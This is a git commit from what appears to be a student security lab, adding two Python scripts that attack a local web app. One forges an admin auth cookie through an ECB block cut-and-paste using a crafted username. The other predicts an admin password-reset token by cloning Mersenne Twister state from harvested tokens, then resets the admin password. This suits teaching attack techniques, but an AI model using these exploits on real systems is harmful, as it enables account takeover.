4169622be445964724e2cf8f4ba3434d2580eb47
Brian Kwong <bkwong01@calpoly.edu>
2025-02-10 21:22:26 -0800

    Save

---
+++ lab2/postAPI.py
@@ -0,0 +1,46 @@
+import requests
+from tools import *
+from selenium import webdriver
+
+
+# Set the URL for the session
+
+# Make 10000 random accounts
+URL = "http://localhost:8080/register"
+# for i in range(10000):
+#     payload = {"user": f"user{i}", "password": "password123", "register": ""}
+#     requests.post("http://localhost:8080/register", data=payload)
+#     if i % 1000 == 0:
+#         print(f"Created {i} accounts")
+
+# # make the attack account
+session = requests.Session()
+username = ("x" * 11) + "admin" + (chr(0) * 10) + chr(11) + ("x" * 4)
+payload = {"user": username, "password": "password123", "register": ""}
+response = session.post(URL, data=payload)
+
+
+# user=xxxxxx...|admin....|xxxx&uid=1&role=user.....
+# user=xxxxxx...admin....&uid=1&role=admin....
+LOGIN_URL = "http://localhost:8080/"
+payload = {"user": username, "password": "password123", "Login": ""}
+response = session.post(LOGIN_URL, data=payload)
+
+
+cookie = session.cookies.get_dict()["auth_token"]
+cookie = hex_to_ascii(cookie)
+
+adminCookie = cookie[16:32]
+newAdminCookie = cookie[:-16] + adminCookie
+newAdminCookie = ascii_to_hex(newAdminCookie)
+session.cookies.set("auth_token", newAdminCookie)
+
+HOME_URL = "http://localhost:8080/home"
+response = session.get(HOME_URL)
+with open("output.html", "w") as f:
+    f.write(response.text)
+driver = webdriver.Edge()
+driver.get(LOGIN_URL)
+driver.add_cookie({"name": "auth_token", "value": newAdminCookie})
+driver.get(HOME_URL)
+input("Press Enter to continue...")
---
+++ lab2/tasl2_script.py
@@ -0,0 +1,102 @@
+# Import the require libraries
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from tools import *
+import time
+
+
+"""
+Name : Brian Kwong and Trycia Vong
+"""
+
+USERNAME = ("x" * 11) + "admin" + (chr(0) * 10) + chr(11)
+PASSWORD = "password123"
+BASE_PASSWORD_RESET_URL = "http://localhost:8080/"
+
+
+# Init the chrome web driver
+driver = webdriver.Edge()
+driver.get("http://localhost:8080/register")
+
+# Make a new account
+username = driver.find_element(By.ID)
+register_link.click()
+
+# Enter in the username
+username_input = driver.find_element(By.ID, "user")
+username_input.send_keys(USERNAME)
+
+# Enter in the password
+password_input = driver.find_element(By.ID, "password")
+password_input.send_keys(PASSWORD)
+
+# Submit the form
+regsiter_button = driver.find_element(By.ID, "Register")
+regsiter_button.click()
+
+home_link = driver.find_element(By.LINK_TEXT, "Return")
+home_link.click()
+
+
+reset_password_link = driver.find_element(By.LINK_TEXT, "Forgot Password?")
+reset_password_link.click()
+
+token_list = []
+
+for i in range(78):
+    # Enter in the username
+    username_input = driver.find_element(By.ID, "forgotUser")
+    username_input.send_keys(USERNAME)
+    reset_button = driver.find_element(By.ID, "Reset")
+    reset_button.submit()
+    username_input = driver.find_element(By.ID, "forgotUser")
+    username_input.clear()
+    token = driver.find_element(By.XPATH, "/html/body/div[3]/center/form/p")
+    token_list += tokenSeparator(token.text.split("token=")[1])
+    time.sleep(0.3)
+token_list = list(map(lambda x: untemper_number(int(x)), token_list))
+generator = MT19937(b"0")
+generator.mt = token_list
+generator.index = generator.n
+generated_numbers = []
+for i in range(8):
+    generated_numbers.append(generator.extract_number())
+generated_numbers = list(map(lambda x: str(x), generated_numbers))
+
+
+# Input the admin as the username and rest their password
+username_input = driver.find_element(By.ID, "forgotUser")
+username_input.clear()
+username_input.send_keys("admin")
+reset_button = driver.find_element(By.ID, "Reset")
+reset_button.submit()
+
+# Generate the reset link
+
+reset_link = BASE_PASSWORD_RESET_URL + combineTokens(generated_numbers)
+
+# Go to that reset link
+
+driver.get(reset_link)
+
+
+# Provide a new password
+
+password_input = driver.find_element(By.ID, "password")
+password_input.send_keys("12345")
+reset_button = driver.find_element(By.ID, "Reset Password")
+reset_button.click()
+
+# Login
+
+# Goes to the login page
+driver.get("http://localhost:8080/")
+username_input = driver.find_element(By.ID, "usernameBox")
+username_input.send_keys("admin")
+password_input = driver.find_element(By.ID, "passwordBox")
+password_input.send_keys("12345")
+login_button = driver.find_element(By.ID, "loginButton")
+login_button.click()
+
+# Waits for the user to press enter and close the browser
+input("Press Enter to continue...")
